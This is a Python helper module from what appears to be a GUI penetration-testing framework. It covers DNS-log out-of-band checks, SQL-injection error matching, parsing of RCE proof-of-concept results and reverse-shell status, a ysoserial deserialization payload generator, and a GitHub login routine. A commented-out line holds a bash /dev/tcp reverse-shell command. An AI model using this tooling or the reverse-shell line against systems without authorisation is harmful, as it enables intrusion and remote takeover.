import random,requests,datetime,time,binascii,subprocess,re,sys
import xml.etree.ElementTree as ET
from tkinter import END
from urllib.parse import urlparse
from lxml import etree

#Dnslog判断
class Dnslog:
    def __init__(self):
        #该网站是通过PHPSESSID来判断dns归属谁的所以可以随机一个
        h = "abcdefghijklmnopqrstuvwxyz0123456789"
        salt_cookie = ""
        for i in range(26):
            salt_cookie += random.choice(h)
        self.headers = {
            "Cookie": "PHPSESSID="+salt_cookie
        }
        H = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        salt = ""
        for i in range(15):
            salt += random.choice(H)
        try:
            self.host = str(salt + "." + self.get_dnslog_url())
        except Exception as e:
            print(e)
            self.host=""

    def dns_host(self) -> str:
        #return test.dnslog.cn
        return str(self.host)

    def get_dnslog_url(self):
        try:
            self.dnslog_cn=requests.get("http://www.dnslog.cn/getdomain.php",headers=self.headers,timeout=6).text
            return self.dnslog_cn
        except Exception as e:
            print("[-]获取DOSLOG域名出错%s"%e)

    def result(self) -> bool:
        # DNS判断后续会有更多的DNS判断，保持准确性
        return self.dnslog_cn_dns()

    def dnslog_cn_dns(self) -> bool:
        try:
            status = requests.get("http://www.dnslog.cn/getrecords.php?t="+self.dnslog_cn,headers=self.headers,  timeout=6)
            self.dnslog_cn_text = status.text
            if self.dnslog_cn_text.find('dnslog') != -1:  # 如果找到Key
            #if self.host in self.dnslog_cn_text:  # 如果找到Key
                return True
            else:
                return False
        except Exception as e:
            print("[-]寻找%s请求记录时出错"%self.dnslog_cn, e)

    def dns_text(self):
        return self.dnslog_cn_text

# sql判断
class Sql_scan:
    rules_dict = {}
    def __init__(self, headers, TIMEOUT):
        self.conn = requests.session()
        self.headers = headers
        self.TIMEOUT = TIMEOUT
        self._init_rules()

    def urlopen_get(self, url):
        try:
            self.request = self.conn.get(url, headers=self.headers, timeout=self.TIMEOUT, verify=False, allow_redirects=False)
            html = self.request.text
        except requests.exceptions.Timeout as error:
            html = ''
            #CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            html = ''
            #CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            html = ''
            #CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
        finally:
            return html

    def urlopen_post(self, url, data):
        try:
            self.request = self.conn.post(url, headers=self.headers, data=data, timeout=self.TIMEOUT, verify=False, allow_redirects=False)
            html = self.request.text
        except requests.exceptions.Timeout as error:
            html = ''
            #CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            html = ''
            #CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            html = ''
            #CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
        finally:
            return html

    def _init_rules(self):
        #Sql_scan.rules_dict = {}
        self.tree = ET.parse('./data/error.xml')
        self.root = self.tree.getroot()
        for child in self.root:
            temp_list = []
            temp_dict = {}
            temp_list.append(child.attrib['value'])
            #child.attrib['value']
            for neighbor in child.iter('error'):
                temp_list.append(neighbor.attrib['regexp'])
                #print(neighbor.attrib['regexp'])
            temp_dict[child.attrib['value']] = temp_list
            Sql_scan.rules_dict = {**Sql_scan.rules_dict, **temp_dict}

    def check_sql_exis(self, html, regx_list):
        for regx in regx_list:
            try:
                p_status = re.compile(regx)
                _ = p_status.search(html)
                if _:
                    return 1
            except Exception as e:
                continue
        return 0

#漏洞验证类
class Verification(object):
    CMD = 'echo VuLnEcHoPoCSuCCeSS'
    VULN = 'False'
    DEBUG = None#开启调试模式，输出返回信息
    DELAY = 0#延迟输出
    TIMEOUT = 3#请求超时
    OUTPUT = None#结果输出到文本中
    RUNALLPOC = False#运行所有脚本

    def show(self, request, pocname, method, rawdata, info):
        if Verification.VULN == 'True': #命令执行验证输出
            if Verification.DEBUG == "debug":
                print(rawdata)
                pass
            elif r"PoCWating" in request:
                now.timed(de=Verification.DELAY)
                color (" Command Executed Failed... ...", 'magenta')
            else:
                print (request)
            return None
        if Verification.CMD == "netstat -an" or Verification.CMD == "id" or Verification.CMD == "echo VuLnEcHoPoCSuCCeSS":
            now.timed(de=Verification.DELAY)
            color ("[+] The target is "+pocname+" ["+method+"] "+info, 'green')
        else:
            now.timed(de=Verification.DELAY)
            color ("[?] Can't judge "+pocname, 'yellow')
        #if Verification.DEBUG=="debug":
        #    print (rawdata)
        #if OUTPUT is not None:
        #    self.text_output(self.no_color_show_succes(pocname, info))
            
    def no_rce_show(self, request, pocname, method, rawdata, info):
        if Verification.VULN == 'True':
            if r"PoCWating" in request:
                now.timed(de=Verification.DELAY)
                color (" Command Executed Successfully (No Echo)", 'yellow')
            else:
                print (request)
            return None
        if r"PoCSuSpEct" in request:#有嫌疑
            now.timed(de=Verification.DELAY)
            color ("[?] The target suspect " + pocname + " [" + method + "] " + info, 'yellow')
        elif r"PoCSuCCeSS" in request:#成功
            now.timed(de=Verification.DELAY)
            color ("[+] The target is "+pocname+" ["+method+"] "+info, 'green')
        #print (info)
        #if Verification.DEBUG=="debug":
        #    print (rawdata)
        #if OUTPUT is not None:
        #    self.text_output(self.no_color_show_succes(pocname, info))
    def no_color_show_succes(self, pocname, info):
        return "--> "+pocname+" "+info
    def no_color_show_failed(self, pocname, info):
        return "--> "+pocname+" "+info
    def generic_output(self, request, pocname, method, rawdata, info):
        # Echo Error
        if r"echo VuLnEcHoPoCSuCCeSS" in request or r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo%2520VuLnEcHoPoCSuCCeSS" in request or r"%65%63%68%6f%20%56%75%4c%6e%45%63%48%6f%50%6f%43%53%75%43%43%65%53%53" in request:
            now.timed(de=Verification.DELAY)
            color ("[-] The target no "+pocname+"                    \r", 'magenta')
        elif r"VuLnEcHoPoCSuCCeSS" in request: #验证情况下存在漏洞的情况（1）
            self.show(request, pocname, method, rawdata, info)
        # Linux host ====================================================================
        #elif r"uid=" in request:
        #    info = info+color.green(" [os:linux]")
        #    self.show(request, pocname, method, rawdata, info)
        #elif r"Active Internet connections" in request or r"command not found" in request:
        #    info = info+color.green(" [os:linux]")
        #    self.show(request, pocname, method, rawdata, info)
        # Windows host ==================================================================
        #elif r"Active Connections" in request  or r"活动连接" in request:
        #    info = info+color.green(" [os:windows]")
        #    self.show(request, pocname, method, rawdata, info)
        # Public :-)
        elif r":-)" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Apache Tomcat: verification CVE-2020-1938
        elif r"Welcome to Tomcat" in request and r"You may obtain a copy of the License at" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Struts2-045 "233x233"
            self.show(request, pocname, method, rawdata, info)
        # Public: "PoCSuSpEct" in request
        elif r"PoCSuSpEct" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "PoCSuCCeSS" in request
        elif r"PoCSuCCeSS" in request: #执行成功
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "PoCWating" in request ,Failed
        elif r"PoCWating" in request: #有用
            now.timed(de=Verification.DELAY)
            color ("[-] The target no "+pocname+"                    \r", 'magenta')
        # Public: "netstat -an" command check
        elif r"NC-Succes" in request:
            now.timed(de=Verification.DELAY)
            color (" The reverse shell succeeded. Please check", 'green')
        elif r"NC-Failed" in request:
            now.timed(de=Verification.DELAY)
            color (" The reverse shell failed. Please check", 'magenta')
        else:
            #print (now.timed(de=Verification.DELAY)+color.magenta("[-] The target no "+pocname))
            if Verification.VULN == 'True': #命令执行验证输出
                if Verification.DEBUG == "debug":
                    print(rawdata)
                    pass
                elif r"PoCWating" in request: #命令执行失败
                    now.timed(de=Verification.DELAY)
                    color (" Command Executed Failed... ...", 'magenta')
                else: #命令执行不清楚结果，直接返回数据
                    print (request)
                return None
            if Verification.CMD == "netstat -an" or Verification.CMD == "id" or Verification.CMD == "echo VuLnEcHoPoCSuCCeSS":#返回体没有包含命令验证输出的字符
                now.timed(de=Verification.DELAY)
                color ("[-] The target no "+pocname+"                    \r", 'magenta')
            else:
                now.timed(de=Verification.DELAY)
                color ("[?] Can't judge "+pocname, 'yellow')
            #if Verification.DEBUG=="debug":
            #    print (rawdata)

    def timeout_output(self, pocname):
        now.timed(de=Verification.DELAY)
        color (" "+pocname+" check failed because timeout !!!", 'cyan')

    def connection_output(self, pocname):
        now.timed(de=Verification.DELAY)
        color (" "+pocname+" check failed because unable to connect !!!", 'cyan')

    def text_output(self, item):
        with open(Verification.OUTPUT, 'a') as output_file:
            output_file.write("%s\n" % item)
verify = Verification() #漏洞验证框架对象

#重定向输出类
class TextRedirector(object):
    def __init__(self, widget, tag="stdout", index="1"):
        self.widget = widget
        self.tag = tag
        self.index = index
        #颜色定义
        self.widget.tag_config("red", foreground="red")
        self.widget.tag_config("white", foreground="white")
        self.widget.tag_config("green", foreground="green")
        self.widget.tag_config("black", foreground="black")
        self.widget.tag_config("yellow", foreground="yellow")
        self.widget.tag_config("blue", foreground="blue")
        self.widget.tag_config("orange", foreground="orange")
        self.widget.tag_config("pink", foreground="pink")
        self.widget.tag_config("cyan", foreground="cyan")
        self.widget.tag_config("magenta", foreground="magenta")
        self.widget.tag_config("fuchsia", foreground="fuchsia")

    def write(self, str):
        if self.index == "2":#命令执行背景是黑色，字体是绿色。
            self.tag = 'white'
            self.widget.configure(state="normal")
            self.widget.insert(END, str, (self.tag,))
            self.widget.configure(state="disabled")
            self.widget.see(END)
        else:
            self.tag = 'black'
            self.widget.configure(state="normal")
            self.widget.insert(END, str, (self.tag,))
            self.widget.configure(state="disabled")
            self.widget.see(END)

    def Colored(self, str, color='black', end='\n'):
        if end == '':
            str = str.strip('\n')
        self.tag = color
        self.widget.configure(state="normal")
        self.widget.insert(END, str, (self.tag,))
        self.widget.configure(state="disabled")
        self.widget.see(END)

    def flush(self):
        self.widget.update()

    def waitinh(self):
        self.widget.configure(state="normal")
        self.widget.insert(END, str, (self.tag,))
        self.widget.configure(state="disabled")
        self.widget.see(END)

#颜色输出函数
def color(str, color='black', end='\n'):
    #自动添加\n换行符号,方便自动换行
    sys.stdout.Colored(str+'\n', color, end)

#漏洞类型类
class PocType(object):
    # Vuln type
    def rce(self):
        return "[rce]"
    def derce(self):
        return "[deserialization rce]"
    def upload(self):
        return "[upload]"
    def deupload(self):
        return "[deserialization upload]"
    def de(self):
        return "[deserialization]"
    def contains(self):
        return "[file contains]"
    def xxe(self):
        return "[xxe]"
    def sql(self):
        return "[sql]"
    def ssrf(self):
        return "[ssrf]"
    # Exploit Output
    #def exp_nc(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell")
    #def exp_nc_bash(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/127.0.0.1/9999 0>&1\"")
    #def exp_upload(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"upload\" upload webshell")
PocType_ = PocType() #漏洞类型类

#时间类
class Timed(object):
    def timed(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        color ("["+str(now)[11:19]+"] ",'cyan',end="")
    def timed_line(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        color ("["+str(now)[11:19]+"] ",'cyan',end="")
    def no_color_timed(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        print("["+str(now)[11:19]+"] ",end="")
now = Timed() #时间输出对象

def _urlparse(url):
    return url.strip('/')
    try:
        getipport = urlparse(url)
        hostname = getipport.hostname
        port = getipport.port

        if port == None and r"https://" in url:
            port = 443

        elif port == None and r"http://" in url:
            port = 80

        if r"https://" in url:
            url = "https://"+hostname+":"+str(port)

        elif r"http://" in url:
            url = "http://"+hostname+":"+str(port)
        return url
    except Exception as e:
        return url

def random_name(index):
    h = "abcdefghijklmnopqrstuvwxyz0123456789"
    salt_cookie = ""
    for i in range(index):
        salt_cookie += random.choice(h)
    return salt_cookie

def byte_to_hex(pw):
    #pw = b'111111'
    temp = b''
    for x in pw:
        temp += binascii.a2b_hex('%02x' % int('{:08b}'.format(x)[::-1], 2))
    return temp

#使用ysoserial.jar 生成 payload
# return 'aced'
def ysoserial_payload(java_class, java_cmd, java_type='-jar'):
    command = "java {} ysoserial.jar {} \"{}\"".format(java_type,java_class,java_cmd)
    popen = subprocess.Popen(command, stdout=subprocess.PIPE ,shell=True,close_fds=True)
    out,drr = popen.communicate()
    return out
    #return binascii.hexlify(out).decode()

#github登录功能函数
def login_github(username,password):#登陆Github
    #初始化参数
    login_url = 'https://github.com/login'
    session_url = 'https://github.com/session'
    try:
        #获取session
        s = requests.session()
        resp = s.get(login_url).text
        dom_tree = etree.HTML(resp)
        key = dom_tree.xpath('//input[@name="authenticity_token"]/@value')
        user_data = {
            'commit': 'Sign in',
            'utf8': '✓',
            'authenticity_token': key,
            'login': username,
            'password': password
        }
        #发送数据并登陆
        s.post(session_url,data=user_data)
        s.get('https://github.com/settings/profile')
        return s
    except Exception as e:
        print('[-]产生异常，请检查网络设置及用户名和密码')
        #error_Record(str(e), traceback.format_exc())